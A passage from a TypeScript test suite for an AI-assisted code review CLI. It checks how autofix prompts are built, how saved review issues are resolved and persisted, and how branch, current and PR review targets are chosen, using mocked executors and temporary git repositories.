      goal: 'Test goal',
      tasks: [],
    };

    const validReviewResult = {
      issues: [{ title: 'Test Issue', description: 'Test description' }],
      rawOutput: 'Test output',
    } as any;

    const validDiffResult = {
      baseBranch: 'main',
      changedFiles: ['test.ts'],
    } as any;

    // Test null planData
    expect(() => buildAutofixPrompt(null as any, validReviewResult, validDiffResult)).toThrow(
      'planData is required for autofix prompt generation'
    );

    // Test null reviewResult
    expect(() => buildAutofixPrompt(validPlanData, null as any, validDiffResult)).toThrow(
      'reviewResult is required for autofix prompt generation'
    );

    // Test null diffResult
    expect(() => buildAutofixPrompt(validPlanData, validReviewResult, null as any)).toThrow(
      'diffResult is required for autofix prompt generation'
    );

    // Test valid inputs
    expect(() =>
      buildAutofixPrompt(validPlanData, validReviewResult, validDiffResult)
    ).not.toThrow();
  });

  test('buildAutofixPrompt creates proper autofix prompt structure', async () => {
    const planData = {
      id: 42,
      title: 'Test Plan',
      goal: 'Test autofix prompt building',
      details: 'This plan tests the autofix prompt structure',
      tasks: [
        {
          title: 'Fix security issues',
          description: 'Address security vulnerabilities',
        },
        {
          title: 'Improve performance',
          description: 'Optimize slow queries',
        },
      ],
    };

    const mockReviewResult = {
      planId: '42',
      planTitle: 'Test Plan',
      reviewTimestamp: '2024-01-01T00:00:00.000Z',
      baseBranch: 'main',
      changedFiles: ['src/auth.ts', 'src/db.ts'],
      summary: {
        totalIssues: 2,
        criticalCount: 1,
        majorCount: 1,
        minorCount: 0,
        infoCount: 0,
        categoryCounts: {
          security: 1,
          performance: 1,
          bug: 0,
          style: 0,
          compliance: 0,
          testing: 0,
          other: 0,
        },
        filesReviewed: 2,
        overallRating: 'fair' as const,
      },
      issues: [
        {
          id: 'sec-001',
          severity: 'critical' as const,
          category: 'security' as const,
          content: 'SQL Injection vulnerability - User input not properly sanitized',
          file: 'src/auth.ts',
          line: 42,
          suggestion: 'Use parameterized queries',
        },
        {
          id: 'perf-001',
          severity: 'major' as const,
          category: 'performance' as const,
          content: 'N+1 query problem - Inefficient database queries in loop',
          file: 'src/db.ts',
          line: 15,
          suggestion: 'Use batch queries or eager loading',
        },
      ],
      rawOutput: 'Mock review output',
      recommendations: ['Use parameterized queries', 'Optimize database access'],
      actionItems: ['Fix SQL injection', 'Implement batch queries'],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/auth.ts', 'src/db.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff content',
    };

    // Import the buildAutofixPrompt function directly for testing
    const { buildAutofixPrompt } = await import('./review.js');
    const autofixPrompt = buildAutofixPrompt(planData, mockReviewResult, diffResult);

    // Verify the prompt structure
    expect(autofixPrompt).toContain('# Autofix Request');
    expect(autofixPrompt).toContain('## Plan Context');
    expect(autofixPrompt).toContain('**Plan ID:** 42');
    expect(autofixPrompt).toContain('**Title:** Test Plan');
    expect(autofixPrompt).toContain('**Goal:** Test autofix prompt building');
    expect(autofixPrompt).toContain('**Details:**');
    expect(autofixPrompt).toContain('This plan tests the autofix prompt structure');

    // Verify tasks are included
    expect(autofixPrompt).toContain('**Tasks:**');
    expect(autofixPrompt).toContain('1. **Fix security issues**');
    expect(autofixPrompt).toContain('Address security vulnerabilities');
    expect(autofixPrompt).toContain('2. **Improve performance**');
    expect(autofixPrompt).toContain('Optimize slow queries');

    // Verify issues are included
    expect(autofixPrompt).toContain('## Review Findings');
    expect(autofixPrompt).toContain('SQL Injection vulnerability');
    expect(autofixPrompt).toContain('N+1 query problem');
    expect(autofixPrompt).toContain('src/auth.ts');
    expect(autofixPrompt).toContain('src/db.ts');
    expect(autofixPrompt).toContain('critical');
    expect(autofixPrompt).toContain('major');

    // Verify instructions are included
    expect(autofixPrompt).toContain('## Instructions');
    expect(autofixPrompt).toContain('Please fix all the issues identified in the review');
    expect(autofixPrompt).toContain('maintaining the plan requirements');
  });

  test('buildAutofixPrompt excludes note severity annotations', () => {
    const planData = {
      id: 42,
      title: 'Test Plan',
      goal: 'Test autofix prompt note filtering',
      tasks: [],
    };
    const reviewResult = {
      issues: [
        {
          id: 'issue-1',
          severity: 'major',
          category: 'bug',
          content: 'Fix the actionable issue',
          file: 'src/actionable.ts',
        },
        {
          id: 'issue-note',
          severity: 'note',
          category: 'other',
          content: 'Descriptive annotation only',
          file: 'src/note.ts',
        },
      ],
      rawOutput: 'raw output with note',
    } as any;
    const diffResult = {
      baseBranch: 'main',
      changedFiles: ['src/actionable.ts'],
    } as any;

    const autofixPrompt = buildAutofixPrompt(planData, reviewResult, diffResult);

    expect(autofixPrompt).toContain('Fix the actionable issue');
    expect(autofixPrompt).not.toContain('Descriptive annotation only');
    expect(autofixPrompt).not.toContain('src/note.ts');
  });

  describe('interactive fix-claude and cleanup actions resolve matching saved issues', () => {
    let originalOutputSocket: string | undefined;

    beforeEach(() => {
      originalOutputSocket = process.env.TIM_OUTPUT_SOCKET;
      delete process.env.TIM_OUTPUT_SOCKET;
    });

    afterEach(() => {
      if (originalOutputSocket === undefined) {
        delete process.env.TIM_OUTPUT_SOCKET;
      } else {
        process.env.TIM_OUTPUT_SOCKET = originalOutputSocket;
      }
    });

    test('interactive fix-claude resolves the saved issue it fixes, keeping the rejected ledger', async () => {
      await writePlanToDb(
        {
          id: 750,
          title: 'Interactive fix-claude resolves saved issues',
          goal: 'Autofix via the interactive action must resolve matching saved issues',
          tasks: [{ title: 'Test task', description: 'A test task with issues' }],
          reviewIssues: [
            {
              id: 'pre-rejected',
              severity: 'major',
              category: 'bug',
              content: 'A previously rejected finding',
              file: 'src/rejected.ts',
              line: 5,
              rejected: true,
              rejectedReason: 'Intentional, matches an existing pattern',
              rejectedAt: '2026-08-03T12:00:00.000Z',
            },
            {
              id: 'pre-open-to-resolve',
              severity: 'minor',
              category: 'style',
              content: 'Inconsistent naming',
              file: 'src/app.ts',
              line: 20,
            },
          ],
        },
        { cwdForIdentity: testDir }
      );

      const mockExecutor = {
        execute: vi.fn(async (_prompt: string, metadata: any) => {
          if (metadata.executionMode === 'review') {
            return JSON.stringify({
              issues: [
                {
                  severity: 'minor',
                  category: 'style',
                  content: 'Inconsistent naming',
                  file: 'src/app.ts',
                  line: '20',
                  suggestion: 'Rename for consistency',
                },
              ],
              recommendations: [],
              actionItems: [],
            });
          }
          expect(metadata.executionMode).toBe('normal');
          return 'Autofix completed successfully';
        }),
      };

      vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
        createMockPlanContext({
          resolvedPlanFile: '750',
          planData: {
            id: 750,
            title: 'Interactive fix-claude resolves saved issues',
            goal: 'Autofix via the interactive action must resolve matching saved issues',
            tasks: [{ title: 'Test task', description: 'A test task with issues' }],
          },
          parentChain: [],
          completedChildren: [],
          diffResult: {
            hasChanges: true,
            changedFiles: ['src/app.ts'],
            baseBranch: 'main',
            diffContent: 'mock diff content',
          },
          incrementalSummary: null,
          noChangesDetected: false,
        }) as any
      );

      vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
        defaultExecutor: 'claude-code',
      } as any);
      vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
      vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('deadbeef');
      vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
        prompt: 'test review prompt',
      } as any);

      promptSelectSpy.mockResolvedValueOnce('fix-claude' as any);
      promptCheckboxSpy.mockResolvedValueOnce([0] as any);

      const result = await handleReviewCommand(750, {}, { parent: { opts: () => ({}) } });

      expect(result.tasksAppended).toBe(0);
      expect(mockExecutor.execute).toHaveBeenCalledTimes(2);

      const updatedPlan = (await resolvePlanByNumericId(750, testDir)).plan;
      // The matching saved finding was resolved by the autofix; the rejected ledger survives.
      expect(updatedPlan.reviewIssues).toEqual([
        expect.objectContaining({ id: 'pre-rejected', rejected: true }),
      ]);
    });

    test('interactive cleanup resolves the saved issues it moves into a cleanup plan, keeping the rejected ledger', async () => {
      await writePlanToDb(
        {
          id: 751,
          title: 'Interactive cleanup resolves saved issues',
          goal: 'Cleanup via the interactive action must resolve matching saved issues',
          tasks: [{ title: 'Test task', description: 'A test task with issues' }],
          reviewIssues: [
            {
              id: 'pre-rejected',
              severity: 'major',
              category: 'bug',
              content: 'A previously rejected finding',
              file: 'src/rejected.ts',
              line: 5,
              rejected: true,
              rejectedReason: 'Intentional, matches an existing pattern',
              rejectedAt: '2026-08-03T12:00:00.000Z',
            },
            {
              id: 'pre-open-to-resolve',
              severity: 'minor',
              category: 'style',
              content: 'Inconsistent naming',
              file: 'src/app.ts',
              line: 20,
            },
          ],
        },
        { cwdForIdentity: testDir }
      );

      const mockExecutor = createMockReviewExecutor(
        JSON.stringify({
          issues: [
            {
              severity: 'minor',
              category: 'style',
              content: 'Inconsistent naming',
              file: 'src/app.ts',
              line: '20',
              suggestion: 'Rename for consistency',
            },
          ],
          recommendations: [],
          actionItems: [],
        })
      );

      vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
        createMockPlanContext({
          resolvedPlanFile: '751',
          planData: {
            id: 751,
            title: 'Interactive cleanup resolves saved issues',
            goal: 'Cleanup via the interactive action must resolve matching saved issues',
            tasks: [{ title: 'Test task', description: 'A test task with issues' }],
          },
          parentChain: [],
          completedChildren: [],
          diffResult: {
            hasChanges: true,
            changedFiles: ['src/app.ts'],
            baseBranch: 'main',
            diffContent: 'mock diff content',
          },
          incrementalSummary: null,
          noChangesDetected: false,
        }) as any
      );

      vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
        defaultExecutor: 'claude-code',
      } as any);
      vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
      vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('deadbeef');
      vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
        prompt: 'test review prompt',
      } as any);

      promptSelectSpy.mockResolvedValueOnce('cleanup' as any);
      promptCheckboxSpy.mockResolvedValueOnce([0] as any);

      const result = await handleReviewCommand(751, {}, { parent: { opts: () => ({}) } });

      expect(result.tasksAppended).toBe(0);

      const updatedPlan = (await resolvePlanByNumericId(751, testDir)).plan;
      // The matching saved finding was resolved because it was selected into the cleanup
      // plan; the rejected ledger survives.
      expect(updatedPlan.reviewIssues).toEqual([
        expect.objectContaining({ id: 'pre-rejected', rejected: true }),
      ]);
      // A real cleanup plan was created as a dependency of this plan.
      expect(updatedPlan.dependencies?.length).toBe(1);
    });
  });

  describe('review issue disposition persistence propagates failures', () => {
    let originalOutputSocket: string | undefined;

    beforeEach(() => {
      originalOutputSocket = process.env.TIM_OUTPUT_SOCKET;
      delete process.env.TIM_OUTPUT_SOCKET;
    });

    afterEach(() => {
      if (originalOutputSocket === undefined) {
        delete process.env.TIM_OUTPUT_SOCKET;
      } else {
        process.env.TIM_OUTPUT_SOCKET = originalOutputSocket;
      }
    });

    test('a write failure during persistence propagates and names what was lost', async () => {
      await writePlanToDb(
        {
          id: 752,
          title: 'Persistence failure propagation',
          goal: 'A failed disposition write must propagate, not be swallowed',
          tasks: [{ title: 'Test task', description: 'A test task with issues' }],
        },
        { cwdForIdentity: testDir }
      );

      const mockExecutor = createMockReviewExecutor(
        JSON.stringify({
          issues: [
            {
              severity: 'major',
              category: 'bug',
              content: 'A blocking finding that will fail to persist',
              file: 'src/app.ts',
              line: '10',
              suggestion: 'Fix it',
            },
          ],
          recommendations: [],
          actionItems: [],
        })
      );

      vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
        createMockPlanContext({
          resolvedPlanFile: '752',
          planData: {
            id: 752,
            title: 'Persistence failure propagation',
            goal: 'A failed disposition write must propagate, not be swallowed',
            tasks: [{ title: 'Test task', description: 'A test task with issues' }],
          },
          parentChain: [],
          completedChildren: [],
          diffResult: {
            hasChanges: true,
            changedFiles: ['src/app.ts'],
            baseBranch: 'main',
            diffContent: 'mock diff content',
          },
          incrementalSummary: null,
          noChangesDetected: false,
        }) as any
      );

      vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
        defaultExecutor: 'claude-code',
      } as any);
      vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
      vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('deadbeef');
      vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
        prompt: 'test review prompt',
      } as any);

      promptSelectSpy.mockResolvedValueOnce('append' as any);
      promptCheckboxSpy.mockResolvedValueOnce([0] as any);

      const writeSpy = vi
        .spyOn(plansModule, 'writePlanFile')
        .mockRejectedValueOnce(new Error('disk full'));

      try {
        await expect(
          handleReviewCommand(752, {}, { parent: { opts: () => ({}) } })
        ).rejects.toThrow(
          /Failed to persist review issue disposition \(1 task\(s\) to append, 1 issue\(s\) to resolve\): disk full/
        );
      } finally {
        writeSpy.mockRestore();
      }

      // The write never completed: no task was appended.
      const updatedPlan = (await resolvePlanByNumericId(752, testDir)).plan;
      expect(updatedPlan.tasks).toHaveLength(1);
    });
  });
});

describe('Auto-selection of branch-specific plans', () => {
  test('auto-selects a DB-backed plan from the current branch name', async () => {
    await writePlanToDb(
      {
        id: 280,
        title: 'DB-selected Plan',
        goal: 'Resolve review plan from branch name',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );

    const materializedPlanPath = join(testDir, '.tim', 'plans', '280.plan.md');
    const mockExecutor = {
      execute: vi.fn(async () =>
        JSON.stringify({
          issues: [],
          recommendations: [],
          actionItems: [],
        })
      ),
    };
    const gatherPlanContextMock = vi.fn(async (planArg: number) => {
      expect(planArg).toBe(280);
      return createMockPlanContext({
        resolvedPlanFile: materializedPlanPath,
        planData: {
          id: 280,
          title: 'DB-selected Plan',
          goal: 'Resolve review plan from branch name',
          tasks: [],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff',
        },
      });
    });

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);
    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
    vi.mocked(contextGatheringModule.gatherPlanContext).mockImplementation(gatherPlanContextMock);
    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentBranchName).mockResolvedValue('280-db-selected-plan');

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(undefined, {}, mockCommand);

    expect(gatherPlanContextMock).toHaveBeenCalledTimes(1);
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
    expect((await readPlanFile(materializedPlanPath)).title).toBe('DB-selected Plan');
  });

  test('branch-name auto-selected DB-only plans materialize before review and autofix execution', async () => {
    process.chdir(testDir);
    await writePlanToDb(
      {
        id: 281,
        title: 'DB-only Branch Autofix Plan',
        goal: 'Verify branch-name review/autofix materialization',
        tasks: [
          {
            title: 'Fix issues from branch-selected review',
            description: 'Materialize before executor handoff',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );
    const persistedPlan = (await resolvePlanByNumericId(281, testDir)).plan;
    const materializedPlanPath = join(testDir, '.tim', 'plans', '281.plan.md');
    await mkdir(join(testDir, '.tim', 'plans'), { recursive: true });
    await writePlanFile(
      materializedPlanPath,
      {
        ...persistedPlan,
        details: 'Local unsynced materialized edits',
        updatedAt: '2026-03-27T10:53:00.000Z',
      },
      { skipDb: true }
    );

    vi.mocked(inquirerModule.confirm).mockRejectedValue(
      new Error('Confirm should not be called with --autofix flag')
    );
    vi.mocked(inquirerModule.checkbox).mockImplementation(async ({ choices }: { choices: any[] }) =>
      choices.map((choice) => choice.value)
    );

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          expect(metadata.planFilePath).toBe(materializedPlanPath);
          const existingMaterializedPlan = await readPlanFile(materializedPlanPath);
          expect(existingMaterializedPlan.details).toBe('Local unsynced materialized edits');
          return JSON.stringify({
            issues: [
              {
                severity: 'major',
                category: 'bug',
                content: 'Missing branch-name autofix coverage',
                file: 'src/tim/commands/review.ts',
                line: '721',
                suggestion: 'Add the missing regression test.',
              },
            ],
            recommendations: [],
            actionItems: [],
          });
        }

        expect(metadata.executionMode).toBe('normal');
        expect(metadata.planFilePath).toBe(materializedPlanPath);
        expect(prompt).toContain('Autofix Request');
        await writeFile(
          materializedPlanPath,
          `---
id: 281
uuid: ${persistedPlan.uuid}
title: DB-only Branch Autofix Plan
goal: Verify branch-name review/autofix materialization
updatedAt: 2026-03-27T10:54:00.000Z
tasks:
  - title: Fix issues from branch-selected review
    description: Materialize before executor handoff
    done: true
---

Updated by branch-name autofix
`
        );
        return 'Autofix completed successfully';
      }),
    };

    const gatherPlanContextMock = vi.fn(async (planArg: number) => {
      expect(planArg).toBe(281);
      return createMockPlanContext({
        resolvedPlanFile: materializedPlanPath,
        planData: {
          id: 281,
          title: 'DB-only Branch Autofix Plan',
          goal: 'Verify branch-name review/autofix materialization',
          tasks: [
            {
              title: 'Fix issues from branch-selected review',
              description: 'Materialize before executor handoff',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/tim/commands/review.ts'],
          baseBranch: 'main',
          diffContent: 'diff content',
        },
      });
    });

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);
    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
    vi.mocked(contextGatheringModule.gatherPlanContext).mockImplementation(gatherPlanContextMock);
    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentBranchName).mockResolvedValue('281-db-only-branch-autofix-plan');

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(undefined, { autofixAll: true, noSave: true }, mockCommand);

    expect(gatherPlanContextMock).toHaveBeenCalledTimes(1);
    expect(mockExecutor.execute).toHaveBeenCalledTimes(2);
    expect(await Bun.file(materializedPlanPath).exists()).toBe(true);
    const materializedPlan = await readPlanFile(materializedPlanPath);
    expect(materializedPlan.details).toBe('Updated by branch-name autofix');
    expect(materializedPlan.tasks?.[0]?.done).toBe(true);
    const updatedPlan = (await resolvePlanByNumericId(281, testDir)).plan;
    expect(updatedPlan.details).toBe('Updated by branch-name autofix');
    expect(updatedPlan.tasks?.[0]?.done).toBe(true);
  });

  test('falls back to current target when the branch name does not identify a DB plan', async () => {
    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);
    vi.mocked(gitModule.getCurrentBranchName).mockResolvedValue(null as any);
    vi.mocked(gitModule.getTrunkBranch).mockResolvedValue('main');
    vi.mocked(contextGatheringModule.gatherPlanContext).mockRejectedValue(
      new Error('plan context should not be gathered for current target fallback')
    );
    await writeFile(join(testDir, 'README.md'), '# test\n');
    await Bun.$`git add README.md`.cwd(testDir).quiet();
    await Bun.$`git commit -m initial`.cwd(testDir).quiet();
    await Bun.$`git branch -M main`.cwd(testDir).quiet();

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await expect(handleReviewCommand(undefined, { noSave: true }, mockCommand)).resolves.toEqual({
      tasksAppended: 0,
      issuesSaved: 0,
    });
    expect(contextGatheringModule.gatherPlanContext).not.toHaveBeenCalled();
  });

  test('falls back to current target when the branch name matches the pattern but the DB plan does not exist', async () => {
    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);
    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentBranchName).mockResolvedValue('999-missing-plan');
    vi.mocked(gitModule.getTrunkBranch).mockResolvedValue('main');
    vi.mocked(contextGatheringModule.gatherPlanContext).mockRejectedValue(
      new Error('plan context should not be gathered for missing branch plan fallback')
    );
    await writeFile(join(testDir, 'README.md'), '# test\n');
    await Bun.$`git add README.md`.cwd(testDir).quiet();
    await Bun.$`git commit -m initial`.cwd(testDir).quiet();
    await Bun.$`git branch -M main`.cwd(testDir).quiet();

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await expect(handleReviewCommand(undefined, { noSave: true }, mockCommand)).resolves.toEqual({
      tasksAppended: 0,
      issuesSaved: 0,
    });
    expect(contextGatheringModule.gatherPlanContext).not.toHaveBeenCalled();
  });

  test('rejects --save-issues for current target before workspace or executor allocation', async () => {
    const setupWorkspaceSpy = vi.spyOn(workspaceSetupModule, 'setupWorkspace');
    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);
    vi.mocked(gitModule.getCurrentBranchName).mockResolvedValue('feature/no-plan');

    try {
      await expect(
        handleReviewCommand(
          undefined,
          { current: true, saveIssues: true },
          { parent: { opts: () => ({}) } }
        )
      ).rejects.toThrow('--save-issues requires a plan-backed review target.');

      expect(setupWorkspaceSpy).not.toHaveBeenCalled();
      expect(executorsModule.buildExecutorAndLog).not.toHaveBeenCalled();
      expect(contextGatheringModule.gatherPlanContext).not.toHaveBeenCalled();
    } finally {
      setupWorkspaceSpy.mockRestore();
    }
  });

  test('rejects an invalid --since commit before loading config or allocating resources', async () => {
    const setupWorkspaceSpy = vi.spyOn(workspaceSetupModule, 'setupWorkspace');

    try {
      await expect(
        handleReviewCommand(
          123,
          { since: 'not-a-commit', autoWorkspace: true },
          { parent: { opts: () => ({}) } }
        )
      ).rejects.toThrow(
        'Invalid value for --since: "not-a-commit". Expected a 7- to 40-character hexadecimal commit hash.'
      );

      expect(configLoaderModule.loadEffectiveConfig).not.toHaveBeenCalled();
      expect(setupWorkspaceSpy).not.toHaveBeenCalled();
      expect(executorsModule.buildExecutorAndLog).not.toHaveBeenCalled();
      expect(contextGatheringModule.gatherPlanContext).not.toHaveBeenCalled();
    } finally {
      setupWorkspaceSpy.mockRestore();
    }
  });

  test('rejects plan-owned options for PR target before PR resolution or workspace allocation', async () => {
    const setupWorkspaceSpy = vi.spyOn(workspaceSetupModule, 'setupWorkspace');
    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);

    try {
      await expect(
        handleReviewCommand(
          undefined,
          { pr: '123', saveIssues: true },
          { parent: { opts: () => ({}) } }
        )
      ).rejects.toThrow('--save-issues requires a plan-backed review target.');

      expect(prContextGatheringModule.gatherPrContext).not.toHaveBeenCalled();
      expect(setupWorkspaceSpy).not.toHaveBeenCalled();
      expect(executorsModule.buildExecutorAndLog).not.toHaveBeenCalled();
      expect(contextGatheringModule.gatherPlanContext).not.toHaveBeenCalled();
    } finally {
      setupWorkspaceSpy.mockRestore();
    }
  });

  test('explicit --current reviews the current worktree without workspace switching or plan context', async () => {
    await createTrackedWorktreeChange(
      testDir,
      'current-target.ts',
      'export const value = 1;\n',
      'export const value = 2;\n'
    );
    const setupWorkspaceSpy = vi.spyOn(workspaceSetupModule, 'setupWorkspace');
    const mockExecutor = createMockReviewExecutor();

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'codex-cli',
    } as any);
    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
    vi.mocked(gitModule.getCurrentBranchName).mockResolvedValue('feature/current-target');
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) => ({ prompt: contextContent }) as any
    );

    try {
      await expect(
        handleReviewCommand(
          undefined,
          { current: true, noSave: true, noAutofix: true },
          { parent: { opts: () => ({}) } }
        )
      ).resolves.toEqual({ tasksAppended: 0, issuesSaved: 0 });

      expect(setupWorkspaceSpy).not.toHaveBeenCalled();
      expect(contextGatheringModule.gatherPlanContext).not.toHaveBeenCalled();
      expect(executorsModule.buildExecutorAndLog).toHaveBeenCalledWith(
        'codex-cli',
        expect.objectContaining({
          baseDir: testDir,
          timEnvironment: expect.not.objectContaining({
            TIM_PLAN_ID: expect.anything(),
          }),
        }),
        expect.objectContaining({ defaultExecutor: 'codex-cli' })
      );
      expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
      const prompt = mockExecutor.execute.mock.calls[0]?.[0] as string;
      expect(prompt).toContain('**Target Kind:** current');
      expect(prompt).toContain('**Current Branch:** feature/current-target');
      expect(prompt).toContain('**Base Branch:** main');
      expect(prompt).not.toContain('Plan Tasks');
    } finally {
      setupWorkspaceSpy.mockRestore();
    }
  });

  test('explicit --branch prepares a workspace on the requested branch without switching current checkout', async () => {
    await createCommittedBaseline(testDir);
    await Bun.$`git checkout -b feature/branch-target`.cwd(testDir).quiet();
    await Bun.$`git checkout main`.cwd(testDir).quiet();
    const originalBranch = (
      await Bun.$`git rev-parse --abbrev-ref HEAD`.cwd(testDir).text()
    ).trim();
    const workspaceDir = await mkdtemp(join(tmpdir(), 'tim-review-branch-workspace-'));
    await Bun.$`git init`.cwd(workspaceDir).quiet();
    await createTrackedWorktreeChange(
      workspaceDir,
      'branch-target.ts',
      'export const branchValue = 1;\n',
      'export const branchValue = 2;\n'
    );
    const setupWorkspaceSpy = vi
      .spyOn(workspaceSetupModule, 'setupWorkspace')
      .mockResolvedValue({ baseDir: workspaceDir } as any);
    const mockExecutor = createMockReviewExecutor();

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'codex-cli',
    } as any);
    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) => ({ prompt: contextContent }) as any
    );

    try {
      await handleReviewCommand(
        undefined,
        { branch: 'feature/branch-target', base: 'main', noSave: true, noAutofix: true },
        { parent: { opts: () => ({}) } }
      );

      expect(setupWorkspaceSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          checkoutBranch: 'feature/branch-target',
          branchName: 'feature/branch-target',
          createBranch: false,
          requireWorkspace: true,
        }),
        testDir,
        undefined,
        expect.objectContaining({ defaultExecutor: 'codex-cli' }),
        'tim review'
      );
      const currentBranch = (
        await Bun.$`git rev-parse --abbrev-ref HEAD`.cwd(testDir).text()
      ).trim();
      expect(currentBranch).toBe(originalBranch);
      expect(contextGatheringModule.gatherPlanContext).not.toHaveBeenCalled();
      const prompt = mockExecutor.execute.mock.calls[0]?.[0] as string;
      expect(prompt).toContain('**Target Kind:** branch');
      expect(prompt).toContain('**Requested Branch:** feature/branch-target');
      expect(prompt).toContain('**Base Branch:** main');
    } finally {
      setupWorkspaceSpy.mockRestore();
    }
  });

  test('explicit --pr populates PR session metadata and planless PR prompt context', async () => {
    const workspaceDir = await mkdtemp(join(tmpdir(), 'tim-review-pr-workspace-'));
    await Bun.$`git init`.cwd(workspaceDir).quiet();
    await createTrackedWorktreeChange(
      workspaceDir,
      'pr-target.ts',
      'export const prValue = 1;\n',
      'export const prValue = 2;\n'
    );
    const setupWorkspaceSpy = vi
      .spyOn(workspaceSetupModule, 'setupWorkspace')
      .mockResolvedValue({ baseDir: workspaceDir } as any);
    const mockExecutor = createMockReviewExecutor();

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'codex-cli',
    } as any);
    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) => ({ prompt: contextContent }) as any
    );
    vi.mocked(prContextGatheringModule.gatherPrContext).mockResolvedValue({
      prStatus: {
        id: 1234,
        pr_url: 'https://github.com/acme/review-tests/pull/123',
        owner: 'acme',
        repo: 'review-tests',
        pr_number: 123,
        author: 'octocat',
        title: 'Add planless PR review',
        state: 'OPEN',
        draft: 0,
        mergeable: 'MERGEABLE',
        head_sha: 'feedface',
        base_branch: 'main',
        head_branch: 'feature/pr-review',
        requested_reviewers: null,
        review_decision: null,
        check_rollup_state: null,
        merged_at: null,
        additions: 3,
        deletions: 1,
        changed_files: 1,
        pr_updated_at: null,
        latest_commit_pushed_at: null,
        ready_at: null,
        last_fetched_at: '2026-06-05T00:00:00.000Z',
        created_at: '2026-06-05T00:00:00.000Z',
        updated_at: '2026-06-05T00:00:00.000Z',
      },
      baseBranch: 'main',
      headBranch: 'feature/pr-review',
      headSha: 'feedface',
      owner: 'acme',
      repo: 'review-tests',
      prNumber: 123,
      prUrl: 'https://github.com/acme/review-tests/pull/123',
    } as any);

    try {
      await handleReviewCommand(
        undefined,
        { pr: '123', noSave: true, noAutofix: true },
        { parent: { opts: () => ({}) } }
      );

      expect(headlessModule.updateHeadlessSessionInfo).toHaveBeenCalledWith({
        linkedPrUrl: 'https://github.com/acme/review-tests/pull/123',
        linkedPrNumber: 123,
        linkedPrTitle: 'Add planless PR review',
      });
      expect(headlessModule.updateHeadlessSessionInfo).toHaveBeenCalledWith({
        workspacePath: workspaceDir,
      });
      expect(setupWorkspaceSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          checkoutBranch: 'feature/pr-review',
          branchName: 'feature/pr-review',
          createBranch: false,
          requireWorkspace: true,
        }),
        testDir,
        undefined,
        expect.objectContaining({ defaultExecutor: 'codex-cli' }),
        'tim review'
      );
      const prompt = mockExecutor.execute.mock.calls[0]?.[0] as string;
      expect(prompt).toContain('**Target Kind:** pr');
      expect(prompt).toContain('**PR URL:** https://github.com/acme/review-tests/pull/123');
      expect(prompt).toContain('**PR Number:** #123');
      expect(prompt).toContain('**PR Title:** Add planless PR review');
      expect(prompt).toContain('**Repository:** acme/review-tests');
      expect(prompt).toContain('**Head Branch:** feature/pr-review');
      expect(prompt).toContain('**Head SHA:** feedface');
      expect(prompt).not.toContain('Plan Tasks');
      expect(prompt).not.toContain('Plan Progress');
      expect(contextGatheringModule.gatherPlanContext).not.toHaveBeenCalled();
    } finally {
